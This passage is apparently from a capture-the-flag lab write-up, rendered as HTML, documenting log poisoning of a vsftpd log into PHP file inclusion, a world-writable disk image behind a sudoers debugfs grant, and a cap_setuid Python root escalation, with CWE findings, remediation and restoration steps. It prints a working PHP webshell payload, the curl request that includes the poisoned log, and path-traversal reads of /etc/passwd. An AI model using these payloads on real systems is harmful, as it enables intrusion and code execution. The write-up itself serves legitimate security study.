+<code>sif</code>, <code>mkdir</code> — but <strong>no shell escape and no exec primitive of any kind</strong>.
+<code>write</code> and <code>dump</code> take a <em>path</em>, and every path that matters is a directory
+<code>www-data</code> cannot write: <code>[lab-home]/hannah</code> is <code>drwx------ hannah hannah</code>,
+<code>[lab-home]/hannahftp</code> is <code>drwx------ hannahftp hannahftp</code>, and there is no
+<code>sshd</code>, no <code>cron</code> and no other <code>hannah</code>-privileged process to plant a key or a
+script for. So the finding stands as <strong>a privilege-boundary and integrity defect
+with no demonstrated escalation</strong>, which is a different and smaller claim than
+&quot;privilege escalation&quot;, and it is filed as one.</p>
+<p><strong>Root cause.</strong> <code>chmod 666 /opt/hannah_disk.img</code> in the image build, applied to a
+path that a <code>sudoers</code> grant subsequently names. The grant's argument list pins the
+<em>string</em>; it does not pin the <em>inode</em>, and <code>sudo</code> does not canonicalise argument
+paths. Whoever can write the file chooses what a higher-privileged process parses.</p>
+<p><strong>Remediation.</strong> <code>chmod 644</code> (or <code>640 root:root</code>) on the image; have the build
+populate it at <code>0755</code>/root-owned and never at <code>0666</code>. Longer term, do not let a
+<code>sudoers</code> argument be a path a lower-privileged user can write, and prefer a
+wrapper that opens the target itself and validates it.</p>
+<h3 id="f3--unauthenticated-rce-as-www-data-via-ftp-log-poisoning">F3 — Unauthenticated RCE as <code>www-data</code> via FTP log poisoning</h3>
+<p><strong>CWE-117</strong> (Improper Output Neutralization for Logs) in vsftpd's logging
+configuration, chained into <strong>CWE-98</strong>. The application's half is F1; this finding
+is about the log file being a world-readable, world-writable-in-content PHP
+inclusion target.</p>
+<p><strong>Evidence.</strong> <code>vsftpd.conf:8-9</code> (<code>xferlog_std_format=NO</code>, <code>dual_log_enable=YES</code>)
+put the FTP <code>USER</code> argument into <code>/var/log/vsftpd.log</code> verbatim; the file is mode
+<code>644</code>. The injected line, verbatim:</p>
+<pre><code>Wed Sep 30 12:54:27 2026 [pid 158] [&lt;?php system($_GET[&quot;c&quot;]); ?&gt;] FAIL LOGIN: Client &quot;[net-0-1]&quot;
+</code></pre>
+<p><strong>Impact.</strong> RCE as <code>uid=33(www-data)</code>, measured — and, because the poison file is
+append-only, <strong>one injection executes on every subsequent request</strong>, which is how
+the corrupt-file behaviour in D3 below was produced.</p>
+<p><strong>Root cause.</strong> A world-readable log file in a fixed path, included as code by an
+unvalidated request value. Neither half is unusual; the composition is the bug, and
+F1 is the half that is the application's to fix.</p>
+<p><strong>Remediation.</strong> Fix F1. Secondarily, keep PHP-includable paths out of
+<code>/var/log</code>, and give the web tier no reason to read log files.</p>
+<h3 id="f4--a-cap_setuid-binary-and-a-sudoers-grant-are-both-gated-on-a">F4 — A <code>cap_setuid</code> binary and a <code>sudoers</code> grant are both gated on a</h3>
+<p>credential that is not in the artefact</p>
+<p><strong>CWE-1220</strong> (Insufficient Granularity of Access Control) — the privilege
+boundary exists and is correct, and the escalation is unreachable. Filed as a
+finding because a challenge that cannot be completed is a defect, per the corpus's
+handling of labs 112 and 102.</p>
+<p><strong>Evidence.</strong> <code>/opt/priv-python</code> is <code>cap_setuid=ep</code> but mode <code>750 root:hannah</code>;
+the only <code>sudoers.d</code> grant targets <code>uid=1001(hannah)</code>; the credential <code>hannah</code> needs
+is absent from 383,786,240 bytes across 12,050 <code>www-data</code>-readable files and from
+the container filesystem entirely at <code>uid=0</code>.</p>
+<p><strong>Impact.</strong> The advertised root escalation cannot be performed from inside the
+target. The <code>cap_setuid</code> binary and the pinned grant are both real, and both dead
+ends for an attacker who has only what the image puts in front of them.</p>
+<p><strong>Root cause.</strong> The build plants the account password with <code>chpasswd</code> and never
+writes it to a file, then plants a <em>decoy</em> file in the ext4 image that the
+<code>sudoers</code> grant points the attacker at. The intended bridge and the intended
+credential were never connected.</p>
+<p><strong>Remediation.</strong> Either write <code>hannah</code>'s password into the image (a challenge
+credential, not a production one) so the grant's output is the credential, or drop
+the ext4 indirection and grant the capability path directly. A decoy secret in the
+exact place the privilege grant points is worse than no hint: it sends the
+attacker to a dead end that looks like progress.</p>
+<h3 id="f5--optpriv-python-reaches-uid0-with-a-single-capability-which-is">F5 — <code>/opt/priv-python</code> reaches <code>uid=0</code> with a <strong>single</strong> capability, which is</h3>
+<p>not a root login</p>
+<p><strong>CWE-250</strong> (Execution with Unnecessary Privileges) — informational, and recorded
+because a report that says &quot;root&quot; without the capability set is a report that is
+half right.</p>
+<p><strong>Evidence</strong>, verbatim, from inside the process:</p>
+<pre><code>=== /opt/priv-python process, BEFORE setuid ===
+Uid=1001	1001	1001	1001
+Gid=1001	1001	1001	1001
+CapInh=0000000000000000
+CapPrm=0000000000000080
+CapEff=0000000000000080
+CapBnd=00000000a80425fb
+NoNewPrivs=0
+os.getuid()=1001 os.geteuid()=1001 os.getgid()=1001
+
+=== /opt/priv-python process, AFTER os.setuid(0) ===
+Uid=0	0	0	0
+Gid=1001	1001	1001	1001
+CapInh=0000000000000000
+CapPrm=0000000000000080
+CapEff=0000000000000080
+CapBnd=00000000a80425fb
+NoNewPrivs=0
+os.getuid()=0 os.geteuid()=0 os.getgid()=1001
+</code></pre>
+<p><code>0x80</code> is bit 7, <code>CAP_SETUID</code>, and it is the <strong>only</strong> effective capability. The
+consequence is observable and is not a subtlety — the same process, at <code>uid=0</code>,
+<strong>cannot read a file it does not own</strong>:</p>
+<pre><code>REWARD /root/root.txt = 'dl{root_d5cc9d7538dc7c341cd96bba5a951520}'
+READ [lab-home]/hannah/user.txt FAILED: PermissionError(13, 'Permission denied')
+</code></pre>
+<p><code>/root/root.txt</code> is <code>600 root:root</code> — the process is the owner, so the mode bits
+admit it. <code>[lab-home]/hannah/user.txt</code> is <code>600 hannah:hannah</code> — the process is neither
+owner nor group member, and reaching it would need <code>CAP_DAC_OVERRIDE</code>, which this
+binary does not carry. <strong>Root's own reward is readable; the user account's is not.</strong></p>
+<p><strong>Remediation.</strong> <code>cap_setuid=ep</code> on an interpreter is a privilege grant with a very
+small blast radius but a very large one in the wrong hands — any argument list,
+including <code>-c</code>, becomes a <code>setuid(0)</code> primitive. If the intent is a demonstration
+of capabilities, that is fine and the mode should stay <code>750 root:hannah</code>. If the
+intent is a working challenge root, it is under-specified.</p>
+<hr />
+<h2 id="controls-that-held">Controls that held</h2>
+<p>Each with the positive control that proves the detector can fire. A control that
+has never seen a success is not a control.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Positive control that proves this detector works</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>?page=</code> allowlist</strong> — the sibling selector is correctly constrained</td>
+<td>The <em>treatment</em> is <code>?studio=</code>, which reads <code>/etc/passwd</code>; the control reads the same file through the guarded selector</td>
+<td><code>?page=../../../../etc/passwd</code> → <code>pages/home.php</code>, no leak. Held.</td>
+</tr>
+<tr>
+<td><strong><code>sudoers</code> argument pinning</strong> — the grant is not an interpreter grant</td>
+<td>The exact granted form, run first, succeeds</td>
+<td><strong>9 forms tested, 8 denied.</strong> See below.</td>
+</tr>
+<tr>
+<td><strong>The <code>debugfs</code> file itself</strong> — no shell escape exists in this build</td>
+<td><code>help</code> enumerated through the grant, full list read</td>
+<td>No <code>!</code>, no <code>sh</code>, no <code>exec</code>. Held.</td>
+</tr>
+<tr>
+<td><strong><code>su</code> as an oracle</strong> — it can distinguish a good password</td>
+<td>Known-correct password for <code>hannahftp</code></td>
+<td><code>uid=1000(hannahftp)</code> vs <code>su: Authentication failure</code>. Held, and it is what makes the break a finding.</td>
+</tr>
+<tr>
+<td><strong><code>test -w</code> / <code>test -x</code> predicates, read as <code>www-data</code></strong></td>
+<td>The same predicates on a root-owned file</td>
+<td><code>test -w</code> and <code>test -r</code> on the <code>sudoers</code> file both <code>rc=1</code>. Not always-true.</td>
+</tr>
+<tr>
+<td><strong>The filesystem-wide password sweep</strong></td>
+<td>The same sweep for a string known to be present</td>
+<td><code>matches_positive=1</code> on <code>/var/www/html/pages/home.php</code>; <code>matches_A=0</code>. Held.</td>
+</tr>
+<tr>
+<td><strong>The image contents are what they claim to be</strong></td>
+<td>The inode size read independently of the content</td>
+<td><code>Size: 19</code> from <code>stat</code> vs 18 characters read. Agree.</td>
+</tr>
+<tr>
+<td><strong>The restore</strong></td>
+<td>Service answering again, not &quot;no errors&quot;</td>
+<td><code>GET /</code> → <code>http=200 bytes=963</code>; 21 and 80 listening; image md5 back to shipped. Held.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-sudoers-argument-control-in-full">The sudoers argument control, in full</h3>
+<p>Lab 93's whole finding was that a <code>sudoers</code> line naming an <em>interpreter</em> lets the
+caller choose what runs, and lab 189 filed an undeclared grant with no argument
+restriction. <strong>This lab is the third data point, and it points the other way.</strong> The
+grant pins the binary <em>and both arguments</em>:</p>
+<pre><code>$ for extra in &quot;-R ls&quot; &quot;-f /dev/null&quot; &quot;--help&quot; &quot;-w&quot;; do ... done
+  grant+&quot;-R ls&quot;       -&gt; sudo: a password is required
+  grant+&quot;-f /dev/null&quot;-&gt; sudo: a password is required
+  grant+&quot;--help&quot;      -&gt; sudo: a password is required
+  grant+&quot;-w&quot;          -&gt; sudo: a password is required
+  no -w, plus -R      -&gt; sudo: a password is required
+  same grant, -u root -&gt; sudo: a password is required
+  bare debugfs, no args -&gt; sudo: a password is required
+  cat via the grant   -&gt; sudo: a password is required
+  the exact grant     -&gt; debugfs 1.47.2 (1-Jan-2025)      rc=0
+</code></pre>
+<p><strong>9 forms, 8 denied, 1 allowed — and the 1 is the one the sudoers file names.</strong>
+Note the third line from the bottom: requesting the <em>same command</em> as <code>uid=0</code> is
+denied, so the grant is bound to the target user as well as the arguments.</p>
+<p><strong>The discriminator is therefore the argument specification, not the fact that the
+command is an interpreter.</strong> <code>debugfs</code> is a program that reads commands from stdin
+— as flexible as an interpreter in the way that matters — and it is nevertheless not
+a lab-93 grant, because the sudoers line fixes the full command line and stdin
+carries no authority over <em>which program</em> runs. What it does leave open is the
+content of the file, which is F2.</p>
+<hr />
+<h2 id="reward">Reward</h2>
+<p><strong>Two rewards, <code>dl{...}</code> — lowercase, not <code>FLAG{...}</code> and not the <code>DL{...}</code> that lab
+209 recorded.</strong> Recorded verbatim, with the identity that read each.</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Mode / owner</th>
+<th>Identity that read it</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>[lab-home]/hannah/user.txt</code></td>
+<td><code>600 hannah:hannah</code>, 42 bytes</td>
+<td><code>uid=1001(hannah) gid=1001(hannah) groups=1001(hannah)</code></td>
+<td><code>dl{user_eedfcf739a076a72412c89a1354a4119}</code></td>
+</tr>
+<tr>
+<td><code>/root/root.txt</code></td>
+<td><code>600 root:root</code>, 42 bytes</td>
+<td><code>Uid=0 0 0 0</code>, <code>os.geteuid()=0</code></td>
+<td><code>dl{root_d5cc9d7538dc7c341cd96bba5a951520}</code></td>
+</tr>
+</tbody>
+</table>
+<p>The root reward was read from inside <code>/opt/priv-python</code> after <code>os.setuid(0)</code>:</p>
+<pre><code>REWARD /root/root.txt = 'dl{root_d5cc9d7538dc7c341cd96bba5a951520}'
+</code></pre>
+<p><strong>Both are behind the unreachable hop.</strong> Per the platform, the root reward is the
+one that counts; it was obtained only with the <code>OPERATOR-SIDE</code> credential. <strong>This
+is a measured absence of an attacker-reachable reward, with the count that
+establishes it: 0 matches for the required credential across 383,786,240 bytes in
+12,050 files, and 0 across the whole container filesystem at <code>uid=0</code>.</strong></p>
+<hr />
+<h2 id="not-tested">NOT tested</h2>
+<p>Stated separately from what was discarded, per the runbook.</p>
+<ol>
+<li><strong><code>www-data</code> → <code>hannah</code> by any route other than <code>su</code>.</strong> Not attempted:
+<code>authorized_keys</code> (no <code>sshd</code> listening, 2 sockets total), <code>cron</code>/<code>systemd</code>
+timers (no timer unit and no crontab was found, and <strong>this is an inference from
+the absence of a unit file, not a measurement of the running timer set</strong>),
+<code>newgrp</code>/<code>chsh</code>/<code>chfn</code> (each requires the account password, which is the missing
+link), and <code>unix_chkpwd</code> (requires <code>shadow</code> group membership, which <code>www-data</code>
+does not have — inferred from <code>/etc/group</code>, not probed with a positive control).</li>
+<li><strong>Whether F2's world-writable image is exploitable under a different
+<code>/opt/hannah_disk.img</code>.</strong> Only the ext4-image case was tested. A symlink or a
+device node at that path was not tried; there are no block devices in the
+container to point one at, which was <strong>inferred</strong> from <code>ls /dev</code>, not
+enumerated.</li>
+<li><strong>Kernel and container-escape surface.</strong> <code>CapBnd=00000000a80425fb</code> was read, and
+the container was not checked for a mounted Docker socket, for
+<code>/proc/sys/kernel/core_pattern</code>, or for host namespace sharing. Out of scope
+for this lab's class.</li>
+<li><strong>Whether the <code>hannah_secret.txt</code> decoy is load-bearing for a second solver's
+route.</strong> I proved it is not <code>hannah</code>'s and not <code>hannahftp</code>'s password. I did not
+test it against the 21 <code>nologin</code> accounts, all of which hold <code>*</code> or <code>!</code> in
+<code>/etc/shadow</code> and so cannot authenticate at all — an inference from the shadow
+field, not a measurement.</li>
+</ol>
+<h2 id="discarded-with-reason">Discarded with reason</h2>
+<ol>
+<li><strong>&quot;Ports 21000–21010 are closed, so there is no hidden service.&quot;</strong> Discarded:
+measured wrong. They are vsftpd PASV data ports, observed listening in 29 of 265
+samples at <code>[net-0-2]:21009</code> during a live transfer, and the port number in the
+kernel table agrees with the server's own <code>227</code> reply.</li>
+<li><strong><code>test -w /opt/hannah_disk.img</code> run through <code>docker exec</code>.</strong> Discarded before it
+could be used: it would have run as <code>uid=0</code> and answered for the wrong identity.
+Re-run inside the <code>www-data</code> exec channel, where it returned <code>rc=0</code> and
+F2 stands. Had it been run as root and answered as root, <strong>F2 would have been
+deleted</strong> — the self-corrections catalogue's §2 shape, caught by asking which
+identity answers.</li>
+<li><strong>The first FTP injection, <code>USER &lt;payload&gt;</code> then <code>QUIT</code>.</strong> Discarded: it wrote 64
+bytes and produced no <code>FAIL LOGIN</code> line, so the username — the only
+attacker-controlled field in that log format — never reached the file. One
+missing command, and it looked like a working primitive.</li>
+<li><strong><code>sudo -l</code> as evidence of what the grant permits.</strong> Discarded: it is a positive
+control that the grant is live. It says nothing about the arguments, and the
+9-form test is what actually characterised the boundary.</li>
+<li><strong>Cracking <code>hannah</code>'s yescrypt hash.</strong> Discarded with a reason: it is not
+necessary, since the image build hands the plaintext over on the operator host,
+and a crack would not have made the credential <em>reachable from inside the
+container</em> — which is the actual question. The claim that the credential is
+absent is about the filesystem, and it was measured on the filesystem.</li>
+</ol>
+<hr />
+<h2 id="instrumentation-defects">Instrumentation defects</h2>
+<p>The section worth reading. Five, all of which produced well-formed output.</p>
+<h3 id="d1--pipestatus0-under-dash-truncated-my-output-silently">D1 — <code>${PIPESTATUS[0]}</code> under <code>dash</code> truncated my output, silently</h3>
+<p><code>system()</code> uses <code>/bin/sh</code>, which on this image is <code>dash</code>. My first multi-part probe
+ended with <code>echo &quot;rc=${PIPESTATUS[0]}&quot;</code>. In <code>dash</code> a bash-ism is a <strong>fatal
+<code>Bad substitution</code> that terminates the shell</strong> — and because the PHP payload prints
+its end marker <em>after</em> <code>system()</code> returns, <strong>the end marker still arrived and the
+truncation was invisible</strong>:</p>
+<pre><code>=== A: exact grant, no -R, interactive-ish under use_pty ===
+debugfs 1.47.2 (1-Jan-2025)
+debugfs:  quit
+---exec-count-in-segment--- 0
+</code></pre>
+<p>Three later cases silently produced nothing, and I first read that as <em>the grant
+denying them</em>. It was not: the shell had died two commands earlier. <strong>Cases B and
+C in that batch are the ones that later proved the argument pinning held, so a
+truncation here would have inverted a control from &quot;held&quot; to &quot;unknown&quot;.</strong></p>
+<p>What caught it: re-running with <code>bash -c</code> and getting all four cases. Every probe
+after this point was wrapped in <code>bash -c</code>, and the harness asserts on the presence
+of <strong>both</strong> markers, so a truncated execution is now a hard error rather than a
+short answer.</p>
+<h3 id="d2--the-poison-file-is-append-only-and-one-fatal-payload-kills-every-later-one">D2 — The poison file is append-only, and one fatal payload kills every later one</h3>
+<p>My first payload was <code>&lt;?php system($_GET[&quot;c&quot;]); ?&gt;</code>. Once the parameter stopped
+being supplied, PHP 8.4 raised <code>TypeError</code> on <code>system(null)</code>, the include aborted,
+and <strong>the request returned <code>500</code> with the body cut off mid-line</strong>:</p>
+<pre><code>$ curl -s -G --data-urlencode &quot;studio=/var/log/vsftpd.log&quot; 'http://[net-0-2]/index.php'
+http=500 bytes=824
+...
+Wed Sep 30 12:54:27 2026 [pid 158] [          &lt;- stops exactly here
+</code></pre>
+<p>The instrument looked exactly like &quot;the injection stopped working&quot;, and the log
+still contained every payload. <strong>An append-only poison file means the experiment is
+never reset: one bad payload poisons all later ones, and the failure surfaces as a
+500 that is easy to attribute to a filter.</strong></p>
+<p>Fixed by making every injected payload non-fatal on its own (<code>?? ''</code> guard) <em>and</em>
+by always supplying the parameter the first payload needs, with a no-op value so it
+stays inert. Each run then carries its own token and is extracted by marker, so
+prior runs' output cannot be mistaken for the current one.</p>
+<h3 id="d3--two-executions-per-request-from-two-live-payloads-in-the-same-file">D3 — Two executions per request, from two live payloads in the same file</h3>
+<p>The consequence of D2 that I nearly filed as a measurement. The first request after
+two payloads existed returned <strong>two</strong> <code>id</code> outputs — both payloads in the log
+execute on every include. The first draft of the hop-1 evidence shows two
+<code>uid=33(www-data)</code> lines and I had to re-run to get a single attributable one.</p>
+<p><strong>Counting &quot;the outputs&quot; would have counted the payloads, not the runs.</strong> Every
+probe after this carries a per-run random token and the harness reports the marker
+count separately, so &quot;how many times did this run execute&quot; and &quot;how much output is
+in this response&quot; stopped being the same question.</p>
+<h3 id="d4--sed--n-3p-read-the-wrong-line-of-a-two-stream-command">D4 — <code>sed -n '3p'</code> read the wrong line of a two-stream command</h3>
+<p><code>debugfs</code> writes its prompt to stdout and interleaves diagnostics. Piping
+<code>2&gt;/dev/null</code> and taking line 3 returned a <strong>15-byte</strong> fragment where the secret is
+<strong>18 bytes</strong> — a silently truncated credential that I then fed to <code>su</code>.</p>
+<p>This is the corpus's §15/§17 family with a new costume: <strong>the tool returned a
+plausible string of the wrong length, and nothing said so.</strong> It was caught by
+<code>od -c</code>, not by reasoning. Had the truncated prefix happened to authenticate, the
+<code>su</code> result would have been right for the wrong reason.</p>
+<p>Fixed by filtering <code>^debugfs</code> and cross-checking the byte count against the inode
+size the image reports independently (<code>Size: 19</code>, of which 18 are content).</p>
+<h3 id="d5--i-deleted-the-log-file-out-from-under-a-running-daemon">D5 — I deleted the log file out from under a running daemon</h3>
+<p>During restore verification I ran <code>rm -f /var/log/vsftpd.log</code> while <code>vsftpd</code> was
+live. The next line written into the log was not a log line at all:</p>
+<pre><code>151 /var/log/vsftpd.log
+</code></pre>
+<p>— a fragment of vsftpd's own startup text, orphaned into a file whose inode the
+daemon had already replaced. <strong>The log poisoning still worked</strong> (the next probe
+produced a correct <code>FAIL LOGIN</code> line), so this would have shipped as a curiosity
+rather than as a defect. The container was then recreated from the image, which is
+the correct response and the reason the final state is clean.</p>
+<p>The generalisable part: <strong>do not delete a file a running process holds open. The
+write succeeds, the write lands somewhere unexpected, and the target keeps
+answering.</strong> The restore was redone by recreating the container rather than by
+undoing edits, which is what made this harmless.</p>
+<hr />
+<h2 id="cross-read-against-siblings">Cross-read against siblings</h2>
+<p>Two places where this engagement contradicts or extends a corpus row. Both are
+stated rather than quietly reconciled.</p>
+<ol>
+<li><strong>Lab 93 (<code>sudoers</code> grant naming an interpreter ⇒ arbitrary code).</strong> Lab 282
+ships a grant that reads commands from <strong>stdin</strong>, which is the same flexibility,
+and it is <strong>not</strong> the same vulnerability: 8 of 9 command forms are denied. The
+discriminator between the two is the <strong>argument specification</strong>, not the nature
+of the program. A one-line extension of lab 93's row: <em>name the argument
+restriction, and check whether the flexible input is argv or stdin</em> — stdin
+carries no authority over which program runs.</li>
+<li><strong>Lab 102 (<code>sudo awk '{print}'</code> hangs on stdin under <code>Defaults use_pty</code>).</strong>
+That hang did <strong>not</strong> reproduce here, and the reason is lab 282's argument
+pinning: the awk-shaped payload is unreachable because <code>-R</code> is refused. Both
+observations are consistent — <code>use_pty</code> is present in both images (confirmed in
+<code>sudo -l</code> output above), and in this lab the hang was never reachable to be
+misdiagnosed.</li>
+</ol>
+<p>Also, and against myself: <code>corpus/249/ADOPTING-WRITEUP.md:3</code> opens with &quot;the
+<strong>twenty-ninth</strong> lab of the series&quot;. That is a self-referential ordinal, which
+<code>method/self-corrections.md</code> §20 rules out. This writeup states no position in the
+series; the reward facts are in the table above and the <code>FLAG{}</code>-column equivalent
+is <code>corpus/INDEX.md</code>.</p>
+<hr />
+<h2 id="restoration">Restoration</h2>
+<p>Recreated from the image, not by undoing edits:</p>
+<pre><code class="language-bash">docker rm -f hannah-coffee_container
+docker run  -d --name hannah-coffee_container hannah-coffee:latest
+</code></pre>
+<p><strong>Verified positively</strong> — each item is a shipped value read back, not &quot;no errors&quot;:</p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+00000000:0015          # 21/tcp LISTEN
+00000000:0050          # 80/tcp LISTEN
+-rw-rw-rw- 1 root root 67108864 Aug  6 08:46 /opt/hannah_disk.img
+6bd87048356bc977690cabc49e4bc820  /opt/hannah_disk.img
+0 /var/log/vsftpd.log
+-rw-r--r-- 1 root root 19 Aug  6 07:05 /tmp/hannah_secret.txt     # build leftover, as shipped
+-rwxr-x--- 1 root hannah 6812336 Aug  6 08:46 /opt/priv-python
+/opt/priv-python cap_setuid=ep
+-r--r----- 1 root root 70 Aug  6 08:46 /etc/sudoers.d/hannah-debugfs
+-rw------- 1 hannah hannah 42 Aug  6 08:46 [lab-home]/hannah/user.txt
+-rw------- 1 root root 42 Aug  6 08:46 /root/root.txt
+0                                        # /etc/hc_rootproof_* : none
+[lab-home]/hannahftp:  total 0                # the 3.9 MB STOR probe is gone
+GET / -&gt; http=200 bytes=963
+</code></pre>
+<p>The image contents inside <code>/opt/hannah_disk.img</code> were read back through the same
+pinned grant to confirm F2's overwrite left nothing behind: <code>hannah_secret.txt</code>,
+19 bytes, mtime <code>6-Aug-2026 08:46</code>.</p>
+<p>Every artefact this engagement created was inside the container
+(<code>/etc/hc_rootproof_*</code>, <code>[lab-home]/hannah/.hc_idproof*</code>, <code>[lab-home]/hannahftp/probe.bin</code>,
+<code>/tmp/*.py</code>, <code>/tmp/root.py</code>, <code>/tmp/evil.img</code>, <code>/tmp/rd.txt</code>), and all of them went
+with the container. On the operator host, scratch files were kept under
+<code>/tmp/[tool]/</code>. No other principal's files were touched, and no prune of any
+kind was run.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
